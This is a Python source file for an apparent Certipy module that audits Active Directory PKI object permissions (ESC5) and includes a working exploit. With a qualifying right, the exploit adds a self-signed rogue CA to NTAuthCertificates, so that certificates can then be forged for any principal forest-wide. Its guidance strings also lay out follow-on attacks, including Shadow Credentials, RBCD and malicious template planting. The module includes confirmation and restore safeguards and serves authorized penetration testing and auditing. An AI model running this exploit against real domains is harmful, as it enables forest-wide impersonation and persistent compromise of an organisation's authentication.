"""
ESC5 (Vulnerable PKI Object Access Control) Module for Certipy.

ESC5 is the SpecterOps catch-all category for dangerous ACEs on the Active
Directory objects that MAKE UP the PKI system, as opposed to a single
certificate template (that's ESC4) or a CA's own ManageCA/ManageCertificates
security descriptor (that's ESC7). 'find' does not check this: it enumerates
certificate templates, CAs, and issuance policies, and none of those queries
touch the containers or CA-adjacent objects this module audits.

Objects audited (all resolved live under the connected DC's own
Configuration NC -- never hardcoded, since guessing wrong in a multi-domain
forest would silently produce zero findings):

  CN=Public Key Services,CN=Services,<config NC>        (top container)
  `-- CN=Enrollment Services,...                         (container)
        `-- one pKIEnrollmentService object per CA        (+ its resolved
                                                            AD computer object)
  `-- CN=Certificate Templates,...                       (container only --
                                                            individual template
                                                            ACLs are ESC4)
  `-- CN=Certification Authorities,...                   (container: forest
                                                            trusted-ROOT objects)
  `-- CN=NTAuthCertificates                               (single object: CAs
                                                            trusted for AD
                                                            AUTHENTICATION)
  `-- CN=OID,...                                          (container: issuance
                                                            policy / ESC13 OIDs)

For each object this checks the four generic dangerous rights (GenericAll,
GenericWrite, WriteDacl, WriteOwner) plus object ownership, and two
attribute/right-specific checks that matter more here than the generic ones:

  - WriteProperty scoped to the cACertificate attribute (its schemaIDGUID is
    resolved live from the Schema NC) on every object type that carries that
    attribute (NTAuthCertificates, CA objects, root-CA objects) -- this is
    the attribute a rogue-CA-trust attack actually needs.
  - Create-Child on every CONTAINER -- lets a grantee add a brand new
    CA/template/root-CA object without needing any right on an existing one.

The 'audit' action is read-only: it resolves the AUTHENTICATED identity's own
SID plus its full group closure (certipy's own tokenGroups-backed
get_user_sids helper -- the same one 'find -vulnerable' uses), and reports
which audited objects THAT identity can already abuse, alongside every other
grantee for defensive visibility (suppress well-known administrative ones
with -hide-admins, same semantics as 'find').

The 'exploit' action performs ONE concrete, automatable escalation: if the
authenticated identity holds a qualifying right on NTAuthCertificates, it
adds a self-signed rogue CA certificate to that object's cACertificate
attribute. This is real, immediately usable domain escalation, and needs
nothing else from this module to weaponize -- once the rogue CA is trusted
for AD authentication, 'certipy-ad forge -ca-pfx <rogue ca.pfx>' signs a
client-auth leaf certificate for ANY principal with the rogue CA's own
private key, entirely offline; no request ever touches the real CA. It never
modifies or removes any EXISTING trusted CA -- only ADD, never REPLACE.

Every other ESC5 sub-case (Enrollment Services / Certificate Templates /
Certification Authorities / OID container control, or control of a CA's own
AD object or its underlying computer object) is reported with manual
next-step guidance rather than auto-exploited: container control chains into
a SEPARATE attack (e.g. planting a malicious template via 'certipy-ad
template', which is then ESC1/ESC4 abuse of that new object) and
CA-computer-object control chains into Shadow Credentials
('certipy-ad shadow') or RBCD against the CA host -- both are distinct,
already-tooled attacks this module should not reimplement inline.

THIS IS A FOREST-WIDE TRUST CHANGE. NTAuthCertificates is read by every DC in
the forest for certificate-based authentication. Adding a rogue CA to it
makes every DC trust that CA immediately. 'exploit' therefore:
  - prompts for confirmation unless -force is given
  - ALWAYS writes a restore record on success, before printing anything else
  - only ever adds; the paired 'restore' action removes EXACTLY the one
    value it added (LDAP MODIFY_DELETE of that literal DER blob), never
    touching any other entry

References:
- https://posts.specterops.io/certified-pre-owned-d95910965cd2
"""

import argparse
import base64
import csv
import datetime
import hashlib
import io
import json
import os
import secrets
import time
from typing import Any, Dict, List, Optional, Set, Tuple

import ldap3
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
from impacket.ldap import ldaptypes
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.utils.conv import escape_filter_chars

from certipy.lib.certificate import (
    cert_to_der,
    create_pfx,
    generate_rsa_key,
    get_subject_from_str,
    load_pfx,
)
from certipy.lib.constants import ActiveDirectoryRights
from certipy.lib.errors import handle_error
from certipy.lib.files import try_to_save_file
from certipy.lib.ldap import LDAPConnection
from certipy.lib.logger import logging
from certipy.lib.security import INHERITED_ACE, is_admin_sid
from certipy.lib.target import Target

# Manual next-step guidance for ESC5 sub-cases this module does not
# auto-exploit -- printed, never executed.
MANUAL_GUIDANCE = {
    "Enrollment Services": (
        "control of the Enrollment Services container lets you register a new CA "
        "object or tamper with an existing one's dNSHostName/flags/"
        "certificateTemplates -- redirect enrollment traffic or stand up a rogue "
        "enrollment endpoint."
    ),
    "Certificate Templates": (
        "control of the Certificate Templates container lets you create a brand "
        "new pKICertificateTemplate object with ESC1-style properties (client-auth "
        "EKU, enrollee-supplies-subject, low-priv enrollment) without needing any "
        "right on an EXISTING template -- see 'certipy-ad template'. Getting a CA "
        "to actually issue it is a separate step (ESC7, or an admin publishing it)."
    ),
    "Certification Authorities": (
        "control of the Certification Authorities container lets you add a rogue "
        "self-signed ROOT CA certificate that Windows will trust for general PKI "
        "chain validation. This is broader than, and distinct from, "
        "NTAuthCertificates: THAT object governs which CAs are trusted for AD "
        "AUTHENTICATION specifically, which is the narrower and more directly "
        "abusable escalation this command automates."
    ),
    "OID": (
        "control of the OID container lets you create or relink msPKI-Enterprise-"
        "Oid issuance-policy objects -- this is ESC13 territory (a policy OID "
        "linked to a privileged group via msDS-OIDToGroupLink)."
    ),
    "Public Key Services": (
        "control of the TOP PKI container is control of everything beneath it "
        "(Enrollment Services, Certificate Templates, Certification Authorities, "
        "NTAuthCertificates, OID) unless a child object's ACL explicitly blocks "
        "inheritance. Treat this as the superset of every guidance line above."
    ),
    "ca-object": (
        "control of the CA's own AD object lets you alter its cACertificate/"
        "dNSHostName/certificateTemplates attributes directly. Combined with "
        "ManageCA/ManageCertificates this becomes ESC7 (see 'certipy-ad ca')."
    ),
    "root-ca-object": (
        "control of this individual trusted-root object lets you replace which "
        "root certificate Windows trusts under that name."
    ),
    "ca-computer": (
        "control of the CA SERVER's AD COMPUTER OBJECT is a full computer-object "
        "takeover primitive: Shadow Credentials ('certipy-ad shadow auto -account "
        "<name>') or RBCD both let you authenticate AS the CA machine account, "
        "which typically has local admin / private-key access on the CA host "
        "itself."
    ),
}


def classify_ace(
    ace: Any,
    cacert_guid: Optional[bytes],
    check_cacert: bool,
    check_create_child: bool,
) -> Tuple[Optional[str], bool, Optional[str]]:
    """
    Classify a single ACE for ESC5 purposes.

    Mirrors the rule MS-DTYP itself uses for object-specific ACEs: an
    ObjectType GUID scopes the grant to exactly that property/child class;
    without one, the granted rights apply to the whole object. Only the
    generic dangerous rights (GenericAll/GenericWrite/WriteDacl/WriteOwner)
    are meaningful when unscoped; WriteProperty is only meaningful here when
    scoped to cACertificate, and Create-Child only on containers.

    Args:
        ace: A single DACL ACE structure from an SR_SECURITY_DESCRIPTOR
        cacert_guid: Raw schemaIDGUID bytes for the cACertificate attribute,
            or None if it could not be resolved (cacert-specific findings
            are skipped in that case)
        check_cacert: Whether this object type carries cACertificate
        check_create_child: Whether this object is a container

    Returns:
        Tuple of (grantee_sid, inherited, right_label), or
        (None, False, None) if the ACE doesn't grant anything ESC5 cares
        about on this object
    """
    if ace["AceType"] not in (
        ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE,
        ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE,
    ):
        # Denied/audit ACEs aren't modeled here, same policy as
        # certipy.lib.security's own ACE parsers.
        return None, False, None

    body = ace["Ace"]
    sid = format_sid(body["Sid"].getData())
    inherited = bool(ace["AceFlags"] & INHERITED_ACE)
    mask = ActiveDirectoryRights(body["Mask"]["Mask"])

    has_object_type = ace[
        "AceType"
    ] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE and body.hasFlag(
        ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    )

    if has_object_type:
        object_type = bytes(body["ObjectType"])
        if (
            check_cacert
            and cacert_guid is not None
            and object_type == cacert_guid
            and ActiveDirectoryRights.WRITE_PROPERTY in mask
        ):
            return sid, inherited, "WriteProperty(cACertificate)"
        if check_create_child and ActiveDirectoryRights.CREATE_CHILD in mask:
            return sid, inherited, "CreateChild"
        return None, False, None

    # No ObjectType restriction: a plain ACCESS_ALLOWED_ACE, or an
    # ACCESS_ALLOWED_OBJECT_ACE without ACE_OBJECT_TYPE_PRESENT. Either way
    # the granted rights apply to the whole object.
    for right, label in (
        (ActiveDirectoryRights.GENERIC_ALL, "GenericAll"),
        (ActiveDirectoryRights.GENERIC_WRITE, "GenericWrite"),
        (ActiveDirectoryRights.WRITE_DACL, "WriteDacl"),
        (ActiveDirectoryRights.WRITE_OWNER, "WriteOwner"),
    ):
        if right in mask:
            return sid, inherited, label
    if check_create_child and ActiveDirectoryRights.CREATE_CHILD in mask:
        return sid, inherited, "CreateChild"
    return None, False, None


def generate_rogue_ca(
    subject: Optional[str], key_size: int, validity_period: int
) -> Tuple[PrivateKeyTypes, x509.Certificate]:
    """
    Generate a self-signed rogue CA certificate suitable for adding to
    NTAuthCertificates: it carries BasicConstraints(ca=True) and a KeyUsage
    permitting keyCertSign/cRLSign, unlike a plain leaf certificate.

    Args:
        subject: Subject for the rogue CA (RFC4514 string). A default,
            clearly-labeled subject is used if not given, so it is never
            mistaken for a legitimate CA in a report
        key_size: RSA key size in bits
        validity_period: Validity period in days

    Returns:
        Tuple of (private key, self-signed CA certificate)
    """
    if not subject:
        subject = f"CN=ESC5-PoC-CA-{secrets.token_hex(4)}"
        logging.warning(f"No -ca-subject specified, using {subject!r}")

    key = generate_rsa_key(key_size)
    name = get_subject_from_str(subject)

    now = datetime.datetime.now(datetime.timezone.utc)
    builder = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=validity_period))
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=True,
                crl_sign=True,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        .add_extension(
            x509.SubjectKeyIdentifier.from_public_key(key.public_key()), critical=False
        )
    )
    certificate = builder.sign(key, hashes.SHA256())
    return key, certificate


class ESC5:
    """
    Audit and exploit ESC5 (vulnerable PKI object access control).
    """

    def __init__(
        self,
        target: Target,
        output: Optional[str] = None,
        hide_admins: bool = False,
        sid: Optional[str] = None,
        dn: Optional[str] = None,
        force: bool = False,
        ca_pfx: Optional[str] = None,
        ca_password: Optional[str] = None,
        ca_subject: Optional[str] = None,
        key_size: int = 2048,
        validity_period: int = 3650,
        out_dir: str = "./esc5",
        restore: Optional[str] = None,
        connection: Optional[LDAPConnection] = None,
        **kwargs: Any,
    ):
        """
        Initialize the ESC5 module.

        Args:
            target: Target information including domain, username, and authentication details
            output: Optional CSV file to write audit findings to
            hide_admins: Don't show well-known administrative grantees in the audit output
            sid: SID of the authenticated identity, for cross-domain operation
            dn: DN of the authenticated identity, for cross-domain operation
            force: Skip confirmation and the audit precondition check before exploiting
            ca_pfx: Path to a rogue CA certificate/key (PFX) to add, instead of self-generating one
            ca_password: Password for ca_pfx, if encrypted
            ca_subject: Subject for a self-generated rogue CA
            key_size: RSA key size for a self-generated rogue CA
            validity_period: Validity period in days for a self-generated rogue CA
            out_dir: Directory to write the rogue CA PFX and restore record to
            restore: Path to a restore record written by a prior exploit run
            connection: Optional existing LDAP connection
            kwargs: Additional arguments
        """
        self.target = target
        self.output = output
        self.hide_admins = hide_admins
        self.sid = sid
        self.dn = dn
        self.force = force
        self.ca_pfx = ca_pfx
        self.ca_password = ca_password
        self.ca_subject = ca_subject
        self.key_size = key_size
        self.validity_period = validity_period
        self.out_dir = out_dir
        self.restore_file = restore
        self.kwargs = kwargs

        self._connection = connection
        self._user_sids: Optional[Set[str]] = None
        self._cacert_guid: Optional[bytes] = None
        self._cacert_guid_resolved = False

    @property
    def connection(self) -> LDAPConnection:
        """
        Get or establish an LDAP connection to the domain.

        Returns:
            Active LDAP connection
        """
        if self._connection is not None:
            return self._connection

        self._connection = LDAPConnection(self.target)
        self._connection.connect()

        return self._connection

    @property
    def user_sids(self) -> Set[str]:
        """
        Get the authenticated identity's SID plus its full group closure.

        Returns:
            Set of SIDs associated with the authenticated identity
        """
        if self._user_sids is None:
            self._user_sids = self.connection.get_user_sids(
                self.target.username, self.sid, self.dn
            )
        return self._user_sids

    @property
    def pki_base(self) -> str:
        """
        DN of the top 'Public Key Services' container, resolved live from
        the connected DC's own Configuration NC.
        """
        return (
            f"CN=Public Key Services,CN=Services,{self.connection.configuration_path}"
        )

    @property
    def ntauth_dn(self) -> str:
        """DN of the NTAuthCertificates object."""
        return f"CN=NTAuthCertificates,{self.pki_base}"

    @property
    def cacert_guid(self) -> Optional[bytes]:
        """
        Raw schemaIDGUID bytes for the cACertificate attribute, resolved
        live from the Schema NC. Refuses to guess: a wrong GUID here would
        silently produce zero cacert-specific findings even when real ones
        exist, which is worse than skipping that one check.

        Returns:
            Raw schemaIDGUID bytes, or None if it could not be resolved
        """
        if self._cacert_guid_resolved:
            return self._cacert_guid

        self._cacert_guid_resolved = True
        schema_path = f"CN=Schema,{self.connection.configuration_path}"
        entries = self.connection.search(
            "(&(objectClass=attributeSchema)(lDAPDisplayName=cACertificate))",
            search_base=schema_path,
            attributes=["schemaIDGUID"],
        )
        if not entries:
            logging.warning(
                "Could not resolve the cACertificate schemaIDGUID from the Schema "
                "partition -- attribute-scoped WriteProperty findings on "
                "NTAuthCertificates/CA objects will be skipped (the four generic "
                "dangerous rights and Create-Child are still fully checked)"
            )
            return None

        raw = entries[0].get_raw("schemaIDGUID")
        if not raw or not raw[0]:
            logging.warning(
                "schemaIDGUID was empty for cACertificate -- skipping that check"
            )
            return None

        self._cacert_guid = raw[0]
        return self._cacert_guid

    # =========================================================================
    # Object discovery
    # =========================================================================

    def gather_pki_objects(self) -> List[Dict[str, Any]]:
        """
        Enumerate every non-template PKI object ESC5 audits.

        Returns:
            List of dicts describing each object: dn, name, object_type,
            check_cacert, check_create_child
        """
        pki_base = self.pki_base
        targets: List[Dict[str, Any]] = []

        containers = [
            ("Public Key Services", pki_base),
            ("Enrollment Services", f"CN=Enrollment Services,{pki_base}"),
            ("Certificate Templates", f"CN=Certificate Templates,{pki_base}"),
            ("Certification Authorities", f"CN=Certification Authorities,{pki_base}"),
            ("OID", f"CN=OID,{pki_base}"),
        ]
        for name, dn in containers:
            targets.append(
                {
                    "dn": dn,
                    "name": name,
                    "object_type": "container",
                    "check_cacert": False,
                    "check_create_child": True,
                }
            )

        targets.append(
            {
                "dn": self.ntauth_dn,
                "name": "NTAuthCertificates",
                "object_type": "ntauth",
                "check_cacert": True,
                "check_create_child": False,
            }
        )

        enrollment_services = self.connection.search(
            "(objectClass=pKIEnrollmentService)",
            search_base=f"CN=Enrollment Services,{pki_base}",
            attributes=["cn", "dNSHostName"],
        )

        ca_computers: List[Tuple[str, str]] = []
        for ca in enrollment_services:
            cn = ca.get("cn") or ca.get("name") or ca["dn"]
            dns_host_name = ca.get("dNSHostName")
            targets.append(
                {
                    "dn": ca["dn"],
                    "name": f"CA:{cn}",
                    "object_type": "ca-object",
                    "check_cacert": True,
                    "check_create_child": False,
                }
            )
            if dns_host_name:
                ca_computers.append((cn, dns_host_name))

        root_cas = self.connection.search(
            "(objectClass=certificationAuthority)",
            search_base=f"CN=Certification Authorities,{pki_base}",
            attributes=["cn"],
        )
        for root_ca in root_cas:
            cn = root_ca.get("cn") or root_ca.get("name") or root_ca["dn"]
            targets.append(
                {
                    "dn": root_ca["dn"],
                    "name": f"root-CA:{cn}",
                    "object_type": "root-ca-object",
                    "check_cacert": True,
                    "check_create_child": False,
                }
            )

        for ca_name, dns_host_name in ca_computers:
            computers = self.connection.search(
                f"(&(objectClass=computer)(dNSHostName={escape_filter_chars(dns_host_name)}))",
                attributes=["sAMAccountName"],
            )
            if not computers:
                logging.debug(
                    f"CA {ca_name!r}: no computer object found for dNSHostName "
                    f"{dns_host_name!r} -- it may live in a different domain of "
                    f"the forest"
                )
                continue
            sam_account_name = (
                computers[0].get("sAMAccountName") or dns_host_name.split(".")[0]
            )
            targets.append(
                {
                    "dn": computers[0]["dn"],
                    "name": sam_account_name,
                    "object_type": "ca-computer",
                    "check_cacert": False,
                    "check_create_child": False,
                }
            )

        return targets

    # =========================================================================
    # Audit
    # =========================================================================

    def _make_finding(
        self,
        pki_object: Dict[str, Any],
        sid: str,
        inherited: bool,
        right: str,
        bind_sids: Set[str],
    ) -> Dict[str, Any]:
        grantee = self.connection.lookup_sid(sid)
        return {
            "target_object": pki_object["name"],
            "target_dn": pki_object["dn"],
            "target_type": pki_object["object_type"],
            "grantee_sid": sid,
            "grantee_name": grantee.get("name") or sid,
            "right": right,
            "inherited": inherited,
            "is_bind_identity": sid in bind_sids,
        }

    def collect_findings(self) -> List[Dict[str, Any]]:
        """
        Walk every audited PKI object's security descriptor and return one
        finding per (grantee, right) that ESC5 cares about, plus one Owner
        finding per object.

        Returns:
            List of finding dicts
        """
        bind_sids = self.user_sids
        cacert_guid = self.cacert_guid
        targets = self.gather_pki_objects()
        logging.info(f"Auditing {len(targets)} PKI object(s) for ESC5")

        findings: List[Dict[str, Any]] = []
        for pki_object in targets:
            entries = self.connection.search(
                "(objectClass=*)",
                search_base=pki_object["dn"],
                search_scope=ldap3.BASE,
                attributes=["nTSecurityDescriptor"],
                query_sd=True,
            )
            if not entries:
                logging.debug(
                    f"Could not read {pki_object['name']!r} ({pki_object['dn']}) -- skipped"
                )
                continue

            security_descriptor = entries[0].get("nTSecurityDescriptor")
            if security_descriptor is None:
                logging.debug(
                    f"No security descriptor returned for {pki_object['name']!r} -- skipped"
                )
                continue

            sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
            sd.fromString(security_descriptor)

            owner_sid = format_sid(sd["OwnerSid"].getData())
            findings.append(
                self._make_finding(pki_object, owner_sid, False, "Owner", bind_sids)
            )

            dacl = sd["Dacl"]
            if not dacl:
                continue
            for ace in dacl["Data"]:
                sid, inherited, right = classify_ace(
                    ace,
                    cacert_guid,
                    pki_object["check_cacert"],
                    pki_object["check_create_child"],
                )
                if sid is None or right is None:
                    continue
                findings.append(
                    self._make_finding(pki_object, sid, inherited, right, bind_sids)
                )

        return findings

    def _write_csv(self, findings: List[Dict[str, Any]], path: str) -> None:
        buffer = io.StringIO()
        fieldnames = [
            "target_object",
            "target_dn",
            "target_type",
            "grantee_sid",
            "grantee_name",
            "right",
            "inherited",
            "is_bind_identity",
        ]
        writer = csv.DictWriter(buffer, fieldnames=fieldnames)
        writer.writeheader()
        for finding in findings:
            row = dict(finding)
            row["inherited"] = "yes" if row["inherited"] else "no"
            row["is_bind_identity"] = "yes" if row["is_bind_identity"] else "no"
            writer.writerow(row)

        saved_path = try_to_save_file(buffer.getvalue(), path)
        logging.info(f"Wrote {len(findings)} finding(s) to {saved_path!r}")

    def _print_manual_guidance(self, hits: List[Dict[str, Any]]) -> None:
        seen: Set[str] = set()
        for hit in hits:
            key = (
                hit["target_object"]
                if hit["target_type"] == "container"
                else hit["target_type"]
            )
            if key in seen:
                continue
            seen.add(key)
            guidance = MANUAL_GUIDANCE.get(key)
            if guidance:
                logging.info(f"{hit['target_object']} ({hit['right']}): {guidance}")

    def audit(self) -> bool:
        """
        Run the read-only ESC5 audit and print a report. Writes a CSV of
        findings to -output if given.

        Returns:
            True if the authenticated identity holds a qualifying right on
            any audited object, False otherwise
        """
        findings = self.collect_findings()

        if self.output:
            self._write_csv(findings, self.output)

        display = findings
        if self.hide_admins:
            display = [f for f in findings if not is_admin_sid(f["grantee_sid"])]

        for finding in display:
            marker = " <- YOU" if finding["is_bind_identity"] else ""
            inherited = " [inherited]" if finding["inherited"] else ""
            logging.info(
                f"{finding['grantee_name']} has {finding['right']} on "
                f"{finding['target_object']} ({finding['target_type']}){inherited}"
                f"{marker}"
            )

        bind_hits = [f for f in findings if f["is_bind_identity"]]
        ntauth_hits = [f for f in bind_hits if f["target_type"] == "ntauth"]
        other_hits = [f for f in bind_hits if f["target_type"] != "ntauth"]

        if not bind_hits:
            logging.info(
                f"ESC5 preconditions NOT met -- {self.target.username!r} (self + "
                f"full group closure) holds no qualifying right on any audited "
                f"PKI object"
            )
            return False

        logging.warning(
            f"ESC5 preconditions MET -- {self.target.username!r} holds a "
            f"qualifying right on {len(bind_hits)} finding(s):"
        )
        for finding in bind_hits:
            logging.warning(
                f"  {finding['right']} on {finding['target_object']} "
                f"({finding['target_type']})"
            )

        if ntauth_hits:
            logging.info(
                "This is fully automatable: 'certipy-ad esc5 exploit' adds a "
                "self-signed rogue CA to NTAuthCertificates, a forest-wide trust "
                "change -- after which any principal can be impersonated via "
                "'certipy-ad forge'."
            )
        if other_hits:
            self._print_manual_guidance(other_hits)

        return True

    # =========================================================================
    # Exploit / restore
    # =========================================================================

    def _load_or_generate_rogue_ca(
        self,
    ) -> Optional[Tuple[PrivateKeyTypes, x509.Certificate]]:
        if self.ca_pfx:
            try:
                with open(self.ca_pfx, "rb") as f:
                    pfx_data = f.read()
            except OSError as e:
                logging.error(f"Could not read {self.ca_pfx!r}: {e}")
                return None

            password = self.ca_password.encode() if self.ca_password else None
            key, cert = load_pfx(pfx_data, password)
            if key is None or cert is None:
                logging.error(
                    f"Could not load a certificate and key from {self.ca_pfx!r}"
                )
                return None
            return key, cert

        logging.info("Generating a self-signed rogue CA certificate")
        return generate_rogue_ca(self.ca_subject, self.key_size, self.validity_period)

    def exploit(self) -> bool:
        """
        Add a rogue CA certificate to NTAuthCertificates. Refuses to modify
        anything if this doesn't look authorized, unless -force is given.
        Always writes a restore record before printing success.

        Returns:
            True if the rogue CA was added and confirmed present, False otherwise
        """
        if not self.force:
            findings = self.collect_findings()
            ntauth_hits = [
                f
                for f in findings
                if f["target_type"] == "ntauth" and f["is_bind_identity"]
            ]
            if not ntauth_hits:
                logging.warning(
                    f"No ESC5-qualifying right on NTAuthCertificates was found "
                    f"for {self.target.username!r} by this audit. The domain "
                    f"controller is the final arbiter, not this command's ACL "
                    f"parse -- re-run with -force to attempt the write anyway, "
                    f"or run 'certipy-ad esc5 audit' first to investigate."
                )
                return False
            for hit in ntauth_hits:
                logging.info(
                    f"Precondition met: {hit['grantee_name']} has {hit['right']} "
                    f"on NTAuthCertificates"
                )

        result = self._load_or_generate_rogue_ca()
        if result is None:
            return False
        key, cert = result

        der = cert_to_der(cert)
        subject = cert.subject.rfc4514_string()
        serial_hex = format(cert.serial_number, "x")
        sha1 = hashlib.sha1(der).hexdigest()

        logging.warning(
            "Adding a certificate to NTAuthCertificates is a FOREST-WIDE trust "
            "change: every domain controller in the forest will immediately "
            "trust certificates issued by this CA for authentication."
        )
        logging.info(f"Rogue CA subject : {subject}")
        logging.info(f"Rogue CA serial  : {serial_hex}")
        logging.info(f"Rogue CA SHA1    : {sha1}")

        if not self.force:
            confirm = input(
                "Are you sure you want to add this CA to NTAuthCertificates? (y/N): "
            )
            if confirm.strip().lower() != "y":
                logging.info("Aborting")
                return False

        ntauth_dn = self.ntauth_dn
        entries = self.connection.search(
            "(objectClass=*)",
            search_base=ntauth_dn,
            search_scope=ldap3.BASE,
            attributes=["cACertificate"],
        )
        if not entries:
            logging.error(f"Could not read {ntauth_dn!r}")
            return False
        prior = entries[0].get_raw("cACertificate") or []
        prior_count = len(prior)
        logging.info(
            f"NTAuthCertificates currently holds {prior_count} certificate(s) -- "
            f"none will be removed, this only adds"
        )

        result = self.connection.modify(
            ntauth_dn, {"cACertificate": [(ldap3.MODIFY_ADD, [der])]}
        )
        if result["result"] != 0:
            logging.error(
                f"Failed to add the rogue CA to NTAuthCertificates: {result['message']}"
            )
            logging.error(
                "This usually means the precondition doesn't actually hold for "
                "this identity (a stale/inherited-only ACE, AdminSDHolder reset, "
                "etc.) -- the domain controller is the final arbiter, not this "
                "command's ACL parse."
            )
            return False

        entries = self.connection.search(
            "(objectClass=*)",
            search_base=ntauth_dn,
            search_scope=ldap3.BASE,
            attributes=["cACertificate"],
        )
        after = entries[0].get_raw("cACertificate") or [] if entries else []
        if der not in after or len(after) != prior_count + 1:
            logging.error(
                f"Modify reported success but re-read does not show the "
                f"expected result (before={prior_count}, after={len(after)}) -- "
                f"verify manually before relying on this."
            )
            return False
        logging.info(
            f"Confirmed: NTAuthCertificates now holds {len(after)} certificate(s)"
        )

        os.makedirs(self.out_dir, exist_ok=True)
        timestamp = time.strftime("%Y%m%d%H%M%S", time.gmtime())

        pfx_path = try_to_save_file(
            create_pfx(key, cert),
            os.path.join(self.out_dir, f"esc5-rogue-ca-{timestamp}.pfx"),
        )

        restore_record = {
            "ntauth_dn": ntauth_dn,
            "domain": self.target.domain,
            "timestamp_utc": timestamp,
            "prior_certificate_count": prior_count,
            "added_certificate_b64": base64.b64encode(der).decode(),
            "added_certificate_subject": subject,
            "added_certificate_serial_hex": serial_hex,
            "added_certificate_sha1": sha1,
            "rogue_ca_pfx_file": pfx_path,
        }
        restore_path = try_to_save_file(
            json.dumps(restore_record, indent=2),
            os.path.join(self.out_dir, f"esc5-ntauth-restore-{timestamp}.json"),
        )

        logging.warning(
            "FOREST-WIDE TRUST CHANGE APPLIED. Every domain controller in the "
            "forest now trusts this CA for certificate-based authentication."
        )
        logging.info(f"Rogue CA PFX   : {pfx_path}")
        logging.info(f"Restore record : {restore_path}")
        logging.info(
            f"To undo            : certipy-ad esc5 restore -restore {restore_path} ..."
        )
        logging.info(
            f"To weaponize       : certipy-ad forge -ca-pfx {pfx_path} -upn "
            f"<principal>@{self.target.domain}"
        )
        logging.warning(
            "Record this certificate (subject, serial, SHA1 above) in your "
            "findings -- it is a durable trust anchor, exactly like an issued "
            "PFX is a durable credential, until it is removed."
        )
        return True

    def restore(self) -> bool:
        """
        Undo a prior 'exploit' run: remove exactly the rogue CA certificate
        recorded in -restore from NTAuthCertificates, and nothing else.

        Returns:
            True if the restore succeeded (or there was nothing to do),
            False otherwise
        """
        if not self.restore_file:
            logging.error("-restore <file> is required for the restore action")
            return False

        try:
            with open(self.restore_file, "r", encoding="utf-8") as f:
                record = json.load(f)
        except (OSError, json.JSONDecodeError) as e:
            logging.error(f"Could not read restore file {self.restore_file!r}: {e}")
            return False

        ntauth_dn = record["ntauth_dn"]
        der = base64.b64decode(record["added_certificate_b64"])

        entries = self.connection.search(
            "(objectClass=*)",
            search_base=ntauth_dn,
            search_scope=ldap3.BASE,
            attributes=["cACertificate"],
        )
        if not entries:
            logging.error(f"Could not read {ntauth_dn!r} -- refusing to restore blind")
            return False

        current = entries[0].get_raw("cACertificate") or []
        if der not in current:
            logging.info(
                f"The recorded rogue CA (SHA1={record['added_certificate_sha1']}) "
                f"is not present in {ntauth_dn} -- already removed, or never "
                f"applied. Nothing to do."
            )
            return True

        logging.info(
            f"Removing rogue CA (subject={record['added_certificate_subject']}, "
            f"SHA1={record['added_certificate_sha1']}) from {ntauth_dn} -- this "
            f"exact value only, every other trusted CA is left untouched"
        )
        result = self.connection.modify(
            ntauth_dn, {"cACertificate": [(ldap3.MODIFY_DELETE, [der])]}
        )
        if result["result"] != 0:
            logging.error(f"Restore FAILED: {result['message']}")
            return False

        entries = self.connection.search(
            "(objectClass=*)",
            search_base=ntauth_dn,
            search_scope=ldap3.BASE,
            attributes=["cACertificate"],
        )
        after = entries[0].get_raw("cACertificate") or [] if entries else []
        if der in after or len(after) != record["prior_certificate_count"]:
            logging.error(
                f"Modify reported success but re-read is unexpected (expected "
                f"count={record['prior_certificate_count']}, got={len(after)}) "
                f"-- verify manually."
            )
            return False

        logging.info(
            f"Confirmed restored: {ntauth_dn} back to {len(after)} "
            f"certificate(s), matching the pre-exploit count"
        )
        return True


def entry(options: argparse.Namespace) -> None:
    """
    Command-line entry point for ESC5 auditing and exploitation.

    Args:
        options: Command-line arguments
    """
    target = Target.from_options(options, dc_as_target=True)
    options.__delattr__("target")

    esc5 = ESC5(target=target, **vars(options))

    actions = {
        "audit": esc5.audit,
        "exploit": esc5.exploit,
        "restore": esc5.restore,
    }

    try:
        actions[options.esc5_action]()
    except Exception as e:
        logging.error(f"ESC5 {options.esc5_action} failed: {e}")
        handle_error()
